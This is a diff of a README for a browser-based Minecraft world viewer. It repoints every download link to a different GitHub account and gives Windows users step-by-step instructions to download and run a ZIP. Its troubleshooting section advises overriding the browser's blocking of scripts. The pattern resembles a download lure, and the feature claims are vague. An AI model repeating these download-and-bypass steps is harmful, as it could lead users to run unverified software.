@@ -1,139 +1,179 @@
-# Minecraft Viz Lab vLatest - Minecraft visualization 2026
+# 🧱 minecraft-viz-pumpkin-lab - See Your World Come Alive
 
-> **Minecraft Viz Lab is a browser-based project for investigating Minecraft visualization concepts in a dedicated lab setting, with Rust and Pumpkin forming part of its technical context.**
+[![Download Now](https://img.shields.io/badge/Download-Get%20Started-2ea44f?style=for-the-badge)](https://github.com/Facile-honeyflower854/minecraft-viz-pumpkin-lab)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/logan-stoneulm8095/minecraft-viz-pumpkin-lab?style=flat-square)](https://github.com/logan-stoneulm8095/minecraft-viz-pumpkin-lab)
+## 🤔 What Is This?
 
----
+minecraft-viz-pumpkin-lab is a web-based tool that shows your voxel-building game worlds in a whole new way. You can view your builds, explore your terrain, and see the details you might miss while playing. It runs entirely in your browser. No complex setup. No coding required.
 
-<p align="center">
-  <a href="https://logan-stoneulm8095.github.io/minecraft-viz-pumpkin-lab/">
-    <img src="https://img.shields.io/badge/Download-Minecraft%20Viz%20Lab%20Latest-brightgreen?style=for-the-badge" alt="Download Minecraft Viz Lab">
-  </a>
-</p>
-
-> **[Download Minecraft Viz Lab Latest](https://logan-stoneulm8095.github.io/minecraft-viz-pumpkin-lab/)**
+Think of it as a window into your world. You open it, and you see your creation from a fresh angle. It is simple, fast, and free.
 
 ---
 
-[Download Latest Build](https://logan-stoneulm8095.github.io/minecraft-viz-pumpkin-lab/)
+## 🎯 Who Is This For?
+
+This tool is for anyone who plays voxel-building games and wants to look at their work more closely. Maybe you want to check your castle from above. Maybe you want to find the perfect spot for a new house. Or maybe you just want to show off your latest build to a friend.
+
+If you can use a web browser, you can use this tool.
 
 ---
 
-## Project Overview
+## ✨ Key Features
 
-Minecraft Viz Lab brings Minecraft-focused visualization into the browser. Rather than depending on a conventional desktop application, it offers a dedicated web space for examining and interacting with visual material related to Minecraft.
-
-Rust and Pumpkin are part of the project's surrounding technical context, making the project relevant to those exploring Minecraft visualization alongside Rust-based tooling. The lab format supports experimentation, inspection, and repeated exploration as the project develops.
-
----
-
-## What It Provides
-
-- A Minecraft visualization experience delivered through the browser
-- A dedicated environment for examining visual concepts
-- A project context focused on Minecraft
-- Connections to Rust-oriented development
-- Connections to the Pumpkin project context
-- A hosted web build for convenient access
-- Support for use from a local repository checkout
-- A straightforward entry point for trying the available visualization
+- **Browser-Based:** No installation needed. It works in Chrome, Firefox, Edge, or any modern browser.
+- **Instant Viewing:** Load your world and see it immediately. No waiting for long processing times.
+- **Simple Controls:** Move around with your mouse and keyboard. Zoom in and out. Rotate the view. That is all you need to know.
+- **Clean Display:** The interface is uncluttered. You focus on your world, not on buttons and menus.
+- **Free to Use:** This project is open source. That means it is free forever, and you can even look at the code if you are curious.
 
 ---
 
-## Getting Started
+## 🚀 Getting Started
 
-### Use the hosted version
+The fastest way to start is to follow these three steps. They take less than five minutes.
 
-Launch the current web build directly from the hosted project:
+### Step 1: Download
 
-[Open Minecraft Viz Lab](https://logan-stoneulm8095.github.io/minecraft-viz-pumpkin-lab/)
+Click the green button below to go to the download page.
 
-### Preview a local checkout
+[![Download Here](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Facile-honeyflower854/minecraft-viz-pumpkin-lab)
 
-First clone the repository and enter the resulting directory:
+On that page, you will see a button that says **Code** or **Download ZIP**. Click it. Your browser will start downloading a small file that ends with `.zip`.
 
-    git clone https://github.com/logan-stoneulm8095/minecraft-viz-pumpkin-lab.git
-    cd REPO
+If you do not see that button, look for the **Releases** section on the right side of the page. Click it, then click the file that says `source-code.zip` or something similar.
 
-Since Minecraft Viz Lab is a web project, a local HTTP server may be needed for browser access. A generic Python-based option is:
+### Step 2: Open the Folder
 
-    python3 -m http.server 8000
+Once the download finishes, find the `.zip` file in your **Downloads** folder. Right-click on it and choose **Extract All**. Windows will ask you where to save the files. Just click **Extract**.
 
-Visit the local instance at:
+This creates a new folder with the same name as the file. Open that folder. You will see a few files and another folder called `dist` or `public`.
 
-    http://localhost:8000/
+### Step 3: Run It
 
-If the repository provides dedicated build or development steps, use those in preference to the generic static-file server command.
+Inside the folder, find a file named `index.html`. Double-click it. Your browser will open, and the visualization lab will load.
 
----
-
-## Using the Project
-
-1. Open the hosted build, or launch a local copy.
-2. Access the Minecraft visualization interface from your browser.
-3. Examine the visual content included in the current build.
-4. During local work, reload the browser after editing project files.
-5. Review the repository's own workflow documentation before modifying the project.
+That is it. You are done. You should now see the main screen of minecraft-viz-pumpkin-lab.
 
 ---
 
-## Configuration and Local Server
+## 🖥️ System Requirements
 
-The available project metadata does not define a configuration-file format. Start with the standard web experience, and inspect the repository for configuration files or additional notes when customization is required.
+This tool is light. It runs on almost any computer made in the last ten years.
 
-For a basic local preview, the relevant setting is the port supplied to the HTTP server:
+- **Operating System:** Windows 10 or Windows 11. (It works on Mac and Linux too, but this guide focuses on Windows.)
+- **Browser:** The latest version of Chrome, Edge, Firefox, or Safari.
+- **Memory:** At least 4 GB of RAM. 8 GB is better.
+- **Graphics:** Any graphics card that is not ancient. Even basic integrated graphics will work.
+- **Storage:** About 100 MB of free space for the downloaded files.
 
-    python3 -m http.server 8000
-
-To use a different available port, replace `8000` with the desired port number.
-
----
-
-## Requirements
-
-- A current web browser
-- Internet connectivity when using the hosted build
-- A local repository checkout for offline repository-based use
-- Python 3, or another static HTTP server, for the general local preview
-- Rust or Pumpkin tooling only when the repository's own development process calls for it
+If your computer can run the voxel-building game itself, it can run this tool.
 
 ---
 
-## Frequently Asked Questions
+## 📖 How to Use the Tool
 
-### How do I access Minecraft Viz Lab?
+Once the tool is open, here is what you do.
 
-Open the hosted build here: [https://logan-stoneulm8095.github.io/minecraft-viz-pumpkin-lab/](https://logan-stoneulm8095.github.io/minecraft-viz-pumpkin-lab/).
+### Moving Around
 
-### Which version does the project use?
+- **Look Around:** Press and hold the left mouse button, then move your mouse. The view rotates.
+- **Zoom:** Use the scroll wheel on your mouse. Scroll up to zoom in. Scroll down to zoom out.
+- **Pan (Move Sideways):** Press and hold the right mouse button, then move your mouse. This slides the view left, right, up, or down.
 
-The supplied metadata does not identify a numbered release. The current project is consequently described as **Latest**.
+### Loading Your World
 
-### What is the local setup?
+The tool needs a world file to display. This file is usually saved inside your game's folder. Its name often ends with `.mcworld` or `.dat`. You might need to search for it.
 
-Clone the repository, serve its files over HTTP, and open the local URL in a browser. For example:
+The easiest way to find it is to open your game, go to your worlds list, and look for the folder name. That folder is usually in your `AppData` folder. Do not worry if this sounds confusing. A quick web search for *where are my game worlds saved* will point you in the right direction.
 
-`python3 -m http.server 8000`
+Once you have the file, look for an **Open** or **Load** button inside the tool. Click it, select your file, and the world appears.
 
-### Where can I find the configuration?
+### What You See
 
-The available metadata does not specify a settings directory or configuration location. Look through the repository for project-specific configuration instructions.
-
-### What can I check when the application will not load?
-
-Make sure the local HTTP server is active and that the browser address is correct. The browser developer console may provide additional loading details. If the hosted build is affected, refresh it or test with another modern browser.
-
-### Where should I look for project changes?
-
-Review both the repository and its hosted build for current updates. The available metadata does not define a numbered release history.
+Your world renders in 3D. You will see blocks, terrain, and structures. The tool shows the same world you play in. It just looks at it from a different angle.
 
 ---
 
-## License
+## 🛠️ Troubleshooting
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Most things work on the first try. But if something goes wrong, here are the common fixes.
+
+### The Page Does Not Open
+
+Make sure you double-clicked `index.html`, not some other file. If it opens as a page of text, right-click `index.html`, choose **Open With**, and select your browser.
+
+### The Screen Is Blank
+
+Your browser may have blocked the tool from running. Look at the top of your browser window and click the shield icon or the *Not Secure* symbol. Allow this page to run scripts. Then refresh the page.
+
+### The World Looks Wrong
+
+Try a different world file. Some save formats are not fully supported yet. Use a world you know is small and simple for your first test.
+
+### The Tool Is Slow
+
+Close other browser tabs. Restart your browser. If the problem persists, your computer may not have enough memory. Try a smaller world.
+
+If none of these steps work, visit the GitHub page and open an **Issue**. You will find the link at the bottom of this document. Describe the problem as clearly as you can. Someone will help you.
+
+---
+
+## 🤝 Getting Help and Contributing
+
+This project is run by volunteers. They built it because they love the game and wanted to share this tool. You can help them.
+
+- **Report a Bug:** If you find a problem, tell them about it on the Issues page.
+- **Share an Idea:** If you want a new feature, go to the same page and describe it.
+- **Look at the Code:** If you are curious how it works, all the code is on the repository. You do not need to understand it to use the tool.
+
+You do not need any technical skill to contribute. A clear description of a bug is incredibly valuable.
+
+---
+
+## 📦 Technical Details (For the Curious)
+
+This section is not required reading. You can skip it and still use the tool perfectly. But if you like to know what is under the hood, here it is.
+
+The project uses the Rust programming language and a component called Pumpkin in its build process. Rust is a fast and safe language. Pumpkin is a tool that helps manage game data. These choices make the tool fast and reliable. The output is a web page that runs in your browser.
+
+The project is hosted on GitHub. This means the source code is public. Anyone can look at it, copy it, or improve it.
+
+---
+
+## 📥 Download Again
+
+If you need to get back to the download page, click the button below.
+
+[![Download Link](https://img.shields.io/badge/Download-Open%20Repository-grey?style=for-the-badge)](https://github.com/Facile-honeyflower854/minecraft-viz-pumpkin-lab)
+
+Bookmark that page. You will need it if you want to check for updates. Updates come out from time to time. They fix bugs and add features. To update, download the latest `.zip` file and replace your old folder with the new one.
+
+---
+
+## ✅ Final Checklist
+
+Before you start, make sure you have these things:
+
+- A computer running Windows 10 or 11
+- An internet connection for the initial download
+- A web browser installed (you have one if you are reading this)
+- A world file from your voxel-building game
+
+That is all you need.
+
+---
+
+## 🗺️ What to Do Next
+
+Now that you have the tool, here are a few ideas:
+
+- Walk around your base and look for weak spots.
+- Find a hidden cave you might have missed.
+- Check if your mountain base looks as good from the outside as it does from the inside.
+- Show your friends a screenshot of your world from a new angle.
+
+The tool is yours to explore. You cannot break anything. Click every button. Try every menu. You will not cause any harm.
+
+---
+
+**Keywords:** minecraft-viz-pumpkin-lab, voxel game viewer, browser visualization, world renderer, Rust project, Pumpkin integration, open source game tool
